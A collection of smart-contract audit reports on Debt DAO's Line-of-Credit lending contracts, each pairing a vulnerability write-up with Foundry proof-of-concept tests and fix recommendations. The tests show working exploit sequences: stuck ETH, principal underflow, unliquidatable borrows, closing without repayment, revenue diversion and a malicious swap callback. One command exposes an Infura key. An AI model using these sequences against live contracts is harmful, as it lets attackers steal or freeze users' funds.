public {         uint256 amount = 1 ether;         address eth = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);          // fund lender         deal(lender, amount*5);         // fund borrower         deal(borrower, amount*5);          // add credit to line         _addCreditEth(eth, amount);          //borrow 1 ether         bytes32 id = line.ids(0);         vm.startPrank(borrower);         line.borrow(id, amount);         vm.stopPrank();                  //depositAndClose full extra funds (amount * 2)         vm.startPrank(borrower);         line.depositAndClose{value:amount*2}();         vm.stopPrank();          //validate funds are stuck         console.log(address(line).balance);         assert(address(line).balance == amount*2 - amount);     }       function test_freeze_eth_depositAndRepay() public {         uint256 amount = 1 ether;         address eth = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);          // fund lender         deal(lender, amount*5);         // fund borrower         deal(borrower, amount*5);          // add credit to line         _addCreditEth(eth, amount);          //borrow 1 ether         bytes32 id = line.ids(0);         vm.startPrank(borrower);         line.borrow(id, amount);         vm.stopPrank();                  //depositAndRepay full extra funds (amount * 2)         vm.startPrank(borrower);         line.depositAndRepay{value:amount*2}(amount);         vm.stopPrank();           // Lender calls withdraw          vm.startPrank(lender);         line.withdraw(id, amount);         vm.stopPrank();          //validate funds are stuck         assert(address(line).balance == amount*2 - amount);     }      function test_freeze_eth_addCredit() public {         uint256 amount = 1 ether;         address eth = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);          // fund lender         deal(lender, amount*5);         // fund borrower         deal(borrower, amount*5);          // add credit to line         vm.prank(borrower);         line.addCredit(dRate, fRate, amount, eth, lender);         vm.stopPrank();         vm.prank(lender);         //double msg.value then amount         line.addCredit{value: amount*2}(dRate, fRate, amount, eth, lender);         vm.stopPrank();          //borrow 1 ether         bytes32 id = line.ids(0);         vm.startPrank(borrower);         line.borrow(id, amount);         vm.stopPrank();                  //depositAndClose full extra funds (amount)         vm.startPrank(borrower);         line.depositAndClose{value:amount}();         vm.stopPrank();          //validate funds are stuck         assert(address(line).balance == amount*2 - amount);     }      function test_freeze_eth_increaseCredit() public {         uint256 amount = 1 ether;         address eth = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);          // fund lender         deal(lender, amount*5);         // fund borrower         deal(borrower, amount*5);          // add credit to line         _addCreditEth(eth, amount);                  // get id         bytes32 id = line.ids(0);          // increase credit to line         vm.prank(borrower);         line.increaseCredit(id, amount);         vm.stopPrank();         vm.prank(lender);         //double msg.value then amount         line.increaseCredit{value:amount*2}(id, amount);         vm.stopPrank();          //total amount * 3 in contract          //borrow 2 ether         vm.startPrank(borrower);         line.borrow(id, amount * 2);         vm.stopPrank();                  //depositAndClose full extra funds (amount)         vm.startPrank(borrower);         line.depositAndClose{value:amount*2}();         vm.stopPrank();          //validate funds are stuck         assert(address(line).balance == amount*3 - amount*2);     } ```  The POC demonstrates how Borrower and Lender funds get locked in the protocol.  ## Tools Used  VS Code, Foundry  ## Recommended Mitigation Steps Options: 1. refund - in receiveTokenOrETH, refund tokens back to `msg.sender `if `msg.value > amount` 2. revert - change the expression `if(msg.value < amount)` to `if(msg.value != amount)` and revert the transaction.
# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/MutualConsent.sol#L11-L68 https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L247-L262   # Vulnerability details  ## Impact Contracts that inherit from the `MutualConsent` contract, have access to a `mutualConsent` modifier.   Functions that use this modifier need consent from two parties to be called successfully.    Once one party has given consent for a function call, it cannot revoke consent.   This means that the other party can call this function at any time now.    This opens the door for several exploitation paths.   Most notably though the functions `LineOfCredit.setRates()`, `LineOfCredit.addCredit()` and `LineOfCredit.increaseCredit()` can cause problems.    One party can use Social Engineering to make the other party consent to multiple function calls and exploit the multiple consents.    ## Proof of Concept 1. A borrower and lender want to change the rates for a credit.      The borrower wants to create the possibility for himself to change the rates in the future without the lender's consent.   2. The borrower and lender agree to set `dRate` and `fRate` to 5%. 3. The lender calls the `LineOfCredit.setRates()` function to give his consent. 4. The borrower might now say to the lender "Let's put the rate to 5.1% instead, I will give an extra 0.1%" 5. The borrower and lender now both call the `LineOfCredit.setRates()` function to set the rates to 5.1%. 6. The borrower can now set the rates to 5% at any time. E.g. they might increase the rates further in the future (the borrower playing by the rules)      and at some point the borrower can decide to set the rates to 5%.  Links:   `MutualConsent` contract: [https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/MutualConsent.sol](https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/MutualConsent.sol)    `LineOfCredit.setRates()` function: [https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L247-L262](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L247-L262)   ## Tools Used VSCode  ## Recommended Mitigation Steps There are several options to fix this issue: 1. Add a function to the `MutualConsent` contract to revoke consent for a function call. 2. Make consent valid only for a certain amount of time. 3. Invalidate existing consents for a function when function is called with different arguments.  Option 3 requires a lot of additional bookkeeping but is probably the cleanest solution.
# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/LineOfCredit.sol#L223-L244 https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/LineLib.sol#L59-L74   # Vulnerability details  ## Impact Borrower can by mistake add own money to credit if credit is in ETH.  ## Proof of Concept Function `LineOfCredit.addCredit` is used to create new credit. It can be called only after contest of another party. ```solidity     function addCredit(         uint128 drate,         uint128 frate,         uint256 amount,         address token,         address lender     )         external         payable         override         whileActive         mutualConsent(lender, borrower)         returns (bytes32)     {         LineLib.receiveTokenOrETH(token, lender, amount);           bytes32 id = _createCredit(lender, token, amount);           require(interestRate.setRate(id, drate, frate));                  return id;     } ``` `LineLib.receiveTokenOrETH(token, lender, amount)` is responsible for getting payment. https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/LineLib.sol#L59-L74 ```solidity     function receiveTokenOrETH(       address token,       address sender,       uint256 amount     )       external       returns (bool)     {         if(token == address(0)) { revert TransferFailed(); }         if(token != Denominations.ETH) { // ERC20             IERC20(token).safeTransferFrom(sender, address(this), amount);         } else { // ETH             if(msg.value < amount) { revert TransferFailed(); }         }         return true;     } ``` As you can see in case of native token payment, `sender` is not checked to be `msg.sender`, so this makes it's possible that borrower can by mistake pay instead of lender. It sounds funny, but it's possible. What is needed is that lender call `addCredit` first and then borrower calls `addCredit` and provides value.  ## Tools Used VsCode ## Recommended Mitigation Steps Check that if payment in ETH then `lender == msg.sender` in `addCredit` function.
# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L489-L493   # Vulnerability details  A credit line can be closed by using the `LineOfCredit.depositAndClose()` or `LineOfCredit.close`. The remaining funds deposited by the lender (`credit.deposit`) and the accumulated and paid interest are transferred to the lender.  However, if the used credit token `credit.token` is native ETH (or an ERC-777 token with receiver hooks, and under the assumption that the oracle supports this asset in the first place), the lender can reject the closing of the credit by reverting the token transfer.  ## Impact  The lender can prevent the borrower from closing the credit line. This leads to the following consequences:  - Migrating (rollover) to a new line is not possible (it requires all credits to be closed, see [SecuredLine.sol#L55](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SecuredLine.sol#L55)) - Releasing a spigot and transferring ownership to the borrower is not possible (see [SpigotedLineLib.sol#L195](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L195)) - Sweeping remaining tokens (e.g. revenue tokens) in the Spigot to the borrower is not possible (see (SpigotedLineLib.sol#L220)[https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L220])  ## Proof of Concept  [modules/credit/LineOfCredit.sol#L489-L493](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L489-L493)  ```solidity function _close(Credit memory credit, bytes32 id) internal virtual returns (bool) {     if(credit.principal > 0) { revert CloseFailedWithPrincipal(); }      // return the Lender's funds that are being repaid     if (credit.deposit + credit.interestRepaid > 0) {         LineLib.sendOutTokenOrETH(             credit.token,             credit.lender,             credit.deposit + credit.interestRepaid         );     }      delete credits[id]; // gas refunds      // remove from active list     ids.removePosition(id);     unchecked { --count; }      // If all credit lines are closed the the overall Line of Credit facility is declared 'repaid'.     if (count == 0) { _updateStatus(LineLib.STATUS.REPAID); }      emit CloseCreditPosition(id);      return true; } ```  ## Tools Used  Manual review  ## Recommended mitigation steps  Consider using a pull-based pattern to allow the lender to withdraw the funds instead of sending them back directly. 
# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L186   # Vulnerability details  A borrower can repay (parts) of a credit line with the `SpigotedLine.useAndRepay` function. This function will use `amount` of `unusedTokens[credit.token]` as a repayment. However, if `amount` exceeds the principal and the accrued interest, `credit.principal` will underflow without an error and set the principal value to a very large number.  This a problem because a borrower can unknowingly provide a larger than necessary `amount` to the `SpigotedLine.useAndRepay` function to make sure enough funds are used to fully repay the principal and the remaining interest.  Additionally, a lender can do the same thing as the lender can call this function.  ## Impact  The `credit.principal` underflows without an error and will be set to a very large number. This will force a secured line **immediately** into liquidation. Additionally, having a principal value close to `2^256 - 1` will make it hugely expensive to repay the credit line.  ## Proof of Concept  [utils/CreditLib.sol#L186](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L186)  ```solidity function repay(   ILineOfCredit.Credit memory credit,   bytes32 id,   uint256 amount )   external   returns (ILineOfCredit.Credit memory) { unchecked {     if (amount <= credit.interestAccrued) {         credit.interestAccrued -= amount;         credit.interestRepaid += amount;         emit RepayInterest(id, amount);         return credit;     } else {         uint256 interest = credit.interestAccrued;         uint256 principalPayment = amount - interest;          // update individual credit line denominated in token         credit.principal -= principalPayment; // @audit-info potential underflow without an error due to the unchecked block         credit.interestRepaid += interest;         credit.interestAccrued = 0;          emit RepayInterest(id, interest);         emit RepayPrincipal(id, principalPayment);          return credit;     } } } ```  To demonstrate the issue, copy the following test case and paste it into the `SpigotedLine.t.sol` test file. Then run `forge test --match-test "test_lender_use_and_repay_underflow"`.  Following scenario causes the repayment to underflow:  1. Borrower borrows `1 ether` of `revenueToken` 2. `2 ether` worth of `revenueToken` is claimed and traded from the revenue contract 3. Use all of the previously claimed funds (`2 ether`) to repay the line of credit (= `1 ether`) 4. `credit.principal` underflows due to `principalPayment` is larger than `credit.principal`  ```solidity function test_lender_use_and_repay_underflow() public {     uint256 largeRevenueAmount = lentAmount * 2;      deal(address(lender), lentAmount + 1 ether);     deal(address(revenueToken), MAX_REVENUE);     address revenueC = address(0xbeef); // need new spigot for testing     bytes32 id = _createCredit(address(revenueToken), Denominations.ETH, revenueC);      // 1. Borrow lentAmount = 1 ether     _borrow(id, lentAmount);      // 2. Claim and trade largeRevenueAmount = 2 ether (revenue)     bytes memory tradeData = abi.encodeWithSignature(       'trade(address,address,uint256,uint256)',       address(revenueToken),       Denominations.ETH,       1 gwei,       largeRevenueAmount     );      hoax(borrower);     line.claimAndTrade(address(revenueToken), tradeData);      (, uint256 principalBeforeRepaying,,,,,) = line.credits(line.ids(0));     assertEq(principalBeforeRepaying, lentAmount);      // 3. Use and repay debt with previously claimed and traded revenue (largeRevenueAmount = 2 ether)     vm.prank(lender);     line.useAndRepay(largeRevenueAmount);     (, uint256 _principal,,,,,) = line.credits(line.ids(0));      uint256 underflowedPrincipal = principalBeforeRepaying;      unchecked {       underflowedPrincipal -= (largeRevenueAmount);     }      // 4. Principal underflowed     assertEq(_principal, underflowedPrincipal);   } ```  ## Tools Used  Manual review  ## Recommended mitigation steps  Consider asserting `amount` is less or equal than `credit.principal + credit.interestAccrued` (`require(amount <= credit.principal + credit.interestAccrued);`). Similar as how it is done in [`LineOfCredit.depositAndRepay()`](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L326) 
# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L516-L538   # Vulnerability details  ## Description  LineOfCredit manages an array of open credit line identifiers called `ids`. Many interactions with the Line operate on ids\[0\], which is presumed to be the oldest borrow which has non zero principal. For example, borrowers must first deposit and repay to ids\[0\] before other credit lines.   The list is managed by several functions:  1.  CreditListLib.removePosition - deletes parameter id in the ids array 2.  CreditListLib.stepQ - rotates all ids members one to the left, with the leftmost becoming the last element 3.  _sortIntoQ - most complex function, finds the smallest index which can swap identifiers with the parameter id, which satisfies the conditions:     1.  target index is not empty     2.  there is no principal owed for the target index's credit  The idea I had is that if we could corrupt the ids array so that ids\[0\] would be zero, but after it there would be some other active borrows, it would be a very severe situation. The whileBorrowing() modifier assumes if the first element has no principal, borrower is not borrowing.   ``` modifier whileBorrowing() {     if(count == 0 || credits[ids[0]].principal == 0) { revert NotBorrowing(); }     _; } ```  It turns out there is a simple sequence of calls which allows borrowing while ids\[0\] is deleted, and does not re-arrange the new borrow into ids\[0\]!  1.  id1 = addCredit() - add a new credit line, a new id is pushed to the end of ids array. 2.  id2 = addCredit() - called again, ids.length = 2 3.  close(id1) - calls removePosition() on id1, now ids array is \[0x000000000000000000000000, id2 \] 4.  borrow(id2) - will borrow from id2 and call _sortIntoQ. The sorting loop will not find another index other than id2's existing index (`id == bytes32(0)` is true).  From this sequence, we achieve a borrow while ids\[0\] is 0! Therefore, credits\[ids\[0\]\].principal = credits\[0\].principal = 0, and whileBorrowing() reverts.  The impact is massive - the following functions are disabled:  - SecureLine::liquidate() - LineOfCredit::depositAndClose() - LineOfCredit::depositAndRepay() - LineOfCredit::claimAndRepay() - LineOfCredit::claimAndTrade()  ## Impact  Borrower can craft a borrow that cannot be liquidated, even by arbiter. Alternatively, functionality may be completely impaired through no fault of users.  ## Proof of Concept  Copy the following code into LineOfCredit.t.sol  ``` function _addCreditLender2(address token, uint256 amount) public {     // Prepare lender 2 operations, does same as mintAndApprove()     address lender2 = address(21);     deal(lender2, mintAmount);     supportedToken1.mint(lender2, mintAmount);     supportedToken2.mint(lender2, mintAmount);     unsupportedToken.mint(lender2, mintAmount);     vm.startPrank(lender2);     supportedToken1.approve(address(line), MAX_INT);     supportedToken2.approve(address(line), MAX_INT);     unsupportedToken.approve(address(line), MAX_INT);     vm.stopPrank();     // addCredit logic     vm.prank(borrower);     line.addCredit(dRate, fRate, amount, token, lender2);     vm.stopPrank();     vm.prank(lender2);     line.addCredit(dRate, fRate, amount, token, lender2);     vm.stopPrank(); } function test_attackUnliquidatable() public {     bytes32 id_1;     bytes32 id_2;     _addCredit(address(supportedToken1), 1 ether);     _addCreditLender2(address(supportedToken1), 1 ether);     id_1 =  line.ids(0);     id_2 =  line.ids(1);     hoax(borrower);     line.close(id_1);     hoax(borrower);     line.borrow(id_2, 1 ether);     id_1 =  line.ids(0);     id_2 = line.ids(1);     console.log("id1 : ", uint256(id_1));     console.log("id2 : ", uint256(id_2));     vm.warp(ttl+1);     assert(line.healthcheck() == LineLib.STATUS.LIQUIDATABLE);     vm.expectRevert(ILineOfCredit.NotBorrowing.selector);     bool isSolvent = line.declareInsolvent(); } ```  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  When sorting new borrows into the ids queue, do not skip any elements.
# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L48   # Vulnerability details  ## Impact  When withdrawing and refund  ETH, the  contract uses Solidity’s `transfer()` function.   Using Solidity's `transfer()` function has some notable shortcomings when the withdrawer is a smart contract, which can render ETH deposits impossible to withdraw. Specifically, the withdrawal will inevitably fail when: * The withdrawer smart contract does not implement a payable fallback function. * The withdrawer smart contract implements a payable fallback function which uses more than 2300 gas units. * The withdrawer smart contract implements a payable fallback function which needs less than 2300 gas units but is called through a proxy that raises the call’s gas usage above 2300.  Risks of reentrancy stemming from the use of this function can be mitigated by tightly following the "Check-Effects-Interactions" pattern and using OpenZeppelin Contract’s ReentrancyGuard contract.   ## Proof of Concept  ```solidity // Line-of-Credit/contracts/utils/LineLib.sol 48:    payable(receiver).transfer(amount); ```   #### References:  The issues with `transfer()` are outlined [here](https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/ )  For further reference on why using Solidity’s `transfer()` is no longer recommended, refer to these [articles](https://blog.openzeppelin.com/reentrancy-after-istanbul/).    ## Tools Used Manual analysis.  ## Recommended Mitigation Steps  Using low-level `call.value(amount)` with the corresponding result check or using the OpenZeppelin `Address.sendValue` is advised, [reference](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol#L60).   
# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L59-L74   # Vulnerability details  ## Impact  If ERC20 and eth are transferred at same time, the mistakenly sent eth will be locked. There are several functions could be affected and cause user fund lock: - `addCollateral()` - `addCredit()` - `increaseCredit()` - `depositAndClose()` - `depositAndRepay()` - `close()`  ## Proof of Concept  In `receiveTokenOrETH()`, different logic is used to handle ERC20 and eth transfer. However, in the ERC20 if block, mistakenly sent eth will be ignored. This part of eth will be locked in the contract. ```solidity // Line-of-Credit/contracts/utils/LineLib.sol     function receiveTokenOrETH(       address token,       address sender,       uint256 amount     )       external       returns (bool)     {         if(token == address(0)) { revert TransferFailed(); }         if(token != Denominations.ETH) { // ERC20             IERC20(token).safeTransferFrom(sender, address(this), amount);         } else { // ETH             if(msg.value < amount) { revert TransferFailed(); }         }         return true;     } ```   ## Tools Used Manual analysis.  ## Recommended Mitigation Steps  In the ERC20 part, add check for `msg.value` to ensure no eth is sent: ```solidity         if(token != Denominations.ETH) { // ERC20             if (msg.value > 0) { revert TransferFailed(); }             IERC20(token).safeTransferFrom(sender, address(this), amount);         } else { // ETH ``` 
# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L389   # Vulnerability details  ## Impact A borrower can close a credit without repaying the debt to the lender. The lender will be left with a bad debt and the borrower will keep the borrowed amount and the collateral. ## Proof of Concept The `close` function of `LineOfCredit` doesn't check whether a credit exists or not. As a result, the `count` variable is decreased in the internal `_close` function when the `close` function is called with an non-existent credit ID: [LineOfCredit.sol#L388](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L388): ```solidity function close(bytes32 id) external payable override returns (bool) {     Credit memory credit = credits[id];     address b = borrower; // gas savings     if(msg.sender != credit.lender && msg.sender != b) {       revert CallerAccessDenied();     }      // ensure all money owed is accounted for. Accrue facility fee since prinicpal was paid off     credit = _accrue(credit, id);     uint256 facilityFee = credit.interestAccrued;     if(facilityFee > 0) {       // only allow repaying interest since they are skipping repayment queue.       // If principal still owed, _close() MUST fail       LineLib.receiveTokenOrETH(credit.token, b, facilityFee);        credit = _repay(credit, id, facilityFee);     }      _close(credit, id); // deleted; no need to save to storage      return true; } ```  [LineOfCredit.sol#L483](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L483): ```solidity function _close(Credit memory credit, bytes32 id) internal virtual returns (bool) {     if(credit.principal > 0) { revert CloseFailedWithPrincipal(); }      // return the Lender's funds that are being repaid     if (credit.deposit + credit.interestRepaid > 0) {         LineLib.sendOutTokenOrETH(             credit.token,             credit.lender,             credit.deposit + credit.interestRepaid         );     }      delete credits[id]; // gas refunds      // remove from active list     ids.removePosition(id);     unchecked { --count; }      // If all credit lines are closed the the overall Line of Credit facility is declared 'repaid'.     if (count == 0) { _updateStatus(LineLib.STATUS.REPAID); }      emit CloseCreditPosition(id);      return true; } ```  Proof of Concept: ```solidity // contracts/tests/LineOfCredit.t.sol function testCloseWithoutRepaying_AUDIT() public {     assertEq(supportedToken1.balanceOf(address(line)), 0, "Line balance should be 0");     assertEq(supportedToken1.balanceOf(lender), mintAmount, "Lender should have initial mint balance");            _addCredit(address(supportedToken1), 1 ether);      bytes32 id = line.ids(0);     assert(id != bytes32(0));      assertEq(supportedToken1.balanceOf(lender), mintAmount - 1 ether, "Lender should have initial balance less lent amount");          hoax(borrower);     line.borrow(id, 1 ether);     assertEq(supportedToken1.balanceOf(borrower), mintAmount + 1 ether, "Borrower should have initial balance + loan");          // The credit hasn't been repaid.     // hoax(borrower);     // line.depositAndRepay(1 ether);          hoax(borrower);     // Closing with a non-existent credit ID.     line.close(bytes32(uint256(31337)));      // The debt hasn't been repaid but the status is REPAID.     assertEq(uint(line.status()), uint(LineLib.STATUS.REPAID));      // Lender's balance is still reduced by the borrow amount.     assertEq(supportedToken1.balanceOf(lender), mintAmount - 1 ether);      // Borrower's balance still includes the borrowed amount.     assertEq(supportedToken1.balanceOf(borrower), mintAmount + 1 ether); } ``` ## Tools Used Manual review ## Recommended Mitigation Steps In the `close` function of `LineOfCredit`, consider ensuring that a credit with the user-supplied ID exists, before closing it.
# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/f32cb3eeb08663f2456bf6e2fba21e964da3e8ae/contracts/modules/credit/LineOfCredit.sol#L234 https://github.com/debtdao/Line-of-Credit/blob/f32cb3eeb08663f2456bf6e2fba21e964da3e8ae/contracts/modules/credit/LineOfCredit.sol#L270   # Vulnerability details  ## Impact The functions `addCredit` and `increaseCredit` both ahve a `mutualConsent` or `mutualConsentById` modifier. Furthermore, these functions are `payable` and the lender needs to send the corresponding ETH with each call. However, if we look at the mutual consent modifier works, we can a problem: ```solidity modifier mutualConsent(address _signerOne, address _signerTwo) {       if(_mutualConsent(_signerOne, _signerTwo))  {         // Run whatever code needed 2/2 consent         _;       } }  function _mutualConsent(address _signerOne, address _signerTwo) internal returns(bool) {         if(msg.sender != _signerOne && msg.sender != _signerTwo) { revert Unauthorized(); }          address nonCaller = _getNonCaller(_signerOne, _signerTwo);          // The consent hash is defined by the hash of the transaction call data and sender of msg,         // which uniquely identifies the function, arguments, and sender.         bytes32 expectedHash = keccak256(abi.encodePacked(msg.data, nonCaller));          if (!mutualConsents[expectedHash]) {             bytes32 newHash = keccak256(abi.encodePacked(msg.data, msg.sender));              mutualConsents[newHash] = true;              emit MutualConsentRegistered(newHash);              return false;         }          delete mutualConsents[expectedHash];          return true; } ``` The problem is: On the first call, when the other party has not given consent to the call yet, the modifier does not revert. It sets the consent of the calling party instead.  This is very problematic in combination with sending ETH for two reasons: 1.) When the lender performs the calls first and sends ETH along with the call, the call will not revert. It will instead set the consent for him, but the sent ETH is lost. 2.) Even when the lender thinks about this and does not provide any ETH on the first call, the borrower has to perform the second call. Of course, he will not provide the ETH with this call, but this will cause the transaction to revert. There is now no way for the borrower to also grant consent, but still let the lender perform the call.  ## Proof Of Concept Lender Alice calls `LineOfCredit.addCredit` first to add a credit with 1 ETH. She sends 1 ETH with the call. However, because borrower Bob has not performed this call yet, the function body is not executed, but the 1 ETH is still sent. Afterwards, Bob wants to give his consent, so he performs the same call. However, this call reverts, because Bob does not send any ETH with it.   ## Recommended Mitigation Steps Consider implementing an external function to grant consent to avoid this scenario. Also consider reverting when ETH is sent along, but the other party has not given their consent yet.
# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/f32cb3eeb08663f2456bf6e2fba21e964da3e8ae/contracts/utils/SpigotLib.sol#L87   # Vulnerability details  ## Impact Neither `SpigotLib.claimRevenue` nor `SpigotLib._claimRevenue` check that the provided `revenueContract` was registered before. If this is not the case, `SpigotLib._claimRevenue` assumes that this is a revenue contract with push payments (because `self.settings[revenueContract].claimFunction` is 0) and just returns the difference since the last call to `claimRevenue`: ```solidity        if(self.settings[revenueContract].claimFunction == bytes4(0)) {             // push payments              // claimed = total balance - already accounted for balance             claimed = existingBalance - self.escrowed[token]; //@audit Rebasing tokens             // underflow revert ensures we have more tokens than we started with and actually claimed revenue         } ``` `SpigotLib.claimRevenue` will then read `self.settings[revenueContract].ownerSplit`, which is 0 for non-registered revenue contracts: ```solidity uint256 escrowedAmount = claimed * self.settings[revenueContract].ownerSplit / 100; ``` Therefore, the whole `claimed` amount is sent to the treasury.  This becomes very problematic for revenue tokens that use push payments. An attacker (in practice the borrower) can just regularly call `claimRevenue` with this token and a non-existing revenue contract. All of the tokens that were sent to the spigot since the last call will be sent to the treasury and none to the escrow, i.e. a borrower can ensure that no revenue will be available for the lender, no matter what the configured split is.  ## Proof Of Concept As mentioned above, the attack pattern works for arbitrary tokens where one (or more) revenue contracts use push payments, i.e. where the balance of the Spigot increases from time to time. Then, the attacker just calls `claimRevenue` with a non-existing address. This is illustrated in the following diff: ```diff --- a/contracts/tests/Spigot.t.sol +++ b/contracts/tests/Spigot.t.sol @@ -174,7 +174,7 @@ contract SpigotTest is Test {          assertEq(token.balanceOf(address(spigot)), totalRevenue);                    bytes memory claimData; -        spigot.claimRevenue(revenueContract, address(token), claimData); +        spigot.claimRevenue(address(0), address(token), claimData); ``` Thanks to this small modification, all of the tokens are sent to the treasury and none are sent to the escrow.  ## Recommended Mitigation Steps Check that a revenue contract was registered before, revert if it does not.
# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/SpigotedLine.sol#L106-L112 https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/SpigotedLineLib.sol#L75-L85   # Vulnerability details  ## Impact  Lender can trade claimToken in a malicious way to steal the borrower's money via claimAndRepay() in SpigotedLine by using malicious zeroExTradeData.  In the design of the protocol, the lender can use the function claimAndRepay(), the lender can take claimToken by spigot.claimEscrow and then trade the claimToken to the CreditTOken via ZeroEx exchange, then repay the credit.   ``` function claimAndRepay(address claimToken, bytes calldata zeroExTradeData) external         whileBorrowing         nonReentrant         returns (uint256) {   ... // Line 106 - Line 112 uint256 newTokens = claimToken == credit.token ?           spigot.claimEscrow(claimToken) :  // same asset. dont trade           _claimAndTrade(                   // trade revenue token for debt obligation               claimToken,               credit.token,               zeroExTradeData           ); ... // Line 128 - Line 130   credits[id] = _repay(credit, id, repaid);          emit RevenuePayment(claimToken, repaid);  ...  }  ```  ``` function _claimAndTrade(       address claimToken,       address targetToken,       bytes calldata zeroExTradeData     )         internal         returns (uint256)     {         (uint256 tokensBought, uint256 totalUnused) = SpigotedLineLib.claimAndTrade(             claimToken,             targetToken,             swapTarget,             address(spigot),             unusedTokens[claimToken],             zeroExTradeData         );          // we dont use revenue after this so can store now         unusedTokens[claimToken] = totalUnused;         return tokensBought;     } ``` ``` function claimAndTrade(         address claimToken,         address targetToken,         address payable swapTarget,         address spigot,         uint256 unused,         bytes calldata zeroExTradeData     )     external          returns(uint256, uint256)  { ...  trade(             claimed + unused,             claimToken,             swapTarget,             zeroExTradeData         );                  // underflow revert ensures we have more tokens than we started with         uint256 tokensBought = LineLib.getBalance(targetToken) - oldTargetTokens;          if(tokensBought == 0) { revert TradeFailed(); } // ensure tokens bought ...   }  ```  In the function to claimAndTrade in SpigotedLineLib.sol, the check in line 85 to check if tokenBought is not equal to 0 then revert.   The bug here is the zeroExTradeData is controlled by the lender and can be malicious and can manipulate the flow to bypass the check in line 85.  ## Proof of Concept  The following code can manipulate and bypass the check to steal money of the borrower. Step 1: Construct the zeroExTradeData data to sell the claimToken to ETH via the ZeroEx exchange data. The lender constructs the zeroExTradeData to send ETH to the exploit contract.  Step 2: In the exploit contract, have the receive() function to receive ETH from ZeroEx exchange. Since the exchange was from claimToken to ETH, so the exploit contract will receive the ETH and the code in receive function will be hit.   ``` receive() external payable {     console.log("Callback hit: Send the SpigottedLine Contract some CreditToken to bypass the check of Balance");     uint256 amount = 100;      creditToken.transfer(address(line),amount);     console.log("Receive the amount of ETH: %s", msg.value);   }  ``` In the receive() function, the exploit contract transfer some amount of creditToken to the SpigotedLine contract to bypass the check  ```  if(tokensBought == 0) { revert TradeFailed(); } // ensure tokens bought ``` Since this check requires only not 0, so the lender can send only 1 or very small amount, e.g. 100 of creditToken.   This amount then will be used to repay the credit.  So this means, the borrower lost money, because the lender can claim big amount of claimToken and repay a little for the credit.  In the zip file in the Google_Drive link, there is the POC written for this bug.  The test case is test_lender_can_claim_and_repay_3 in file SpigotedLine.t.modified.sol  You can put this file to the tests folder https://drive.google.com/file/d/1IWAV8Zz5KVgw22-gnVZrOxkcYrgv8cO2/view?usp=sharing  You can run the POC by calling:  ``` forge test -m test_lender_can_claim_and_repay_3 -vvvvv --fork-url 'https://mainnet.infura.io/v3/61b30ad3285446cf86bed0c053d864af' --fork-block-n umber 15918000 ``` Here I use the block-number to make the test log stable, but this does not impact the logic of POC.   You can find the detailed log file: Line-of-Credit\test_claim_221107_2311.log The full log file here: https://drive.google.com/file/d/1LTY2-z8gOIOen0Ut9CbX1KpwvDvNVQdx/view?usp=sharing  In this log file, the lender claims 1000 DAI (DAI is 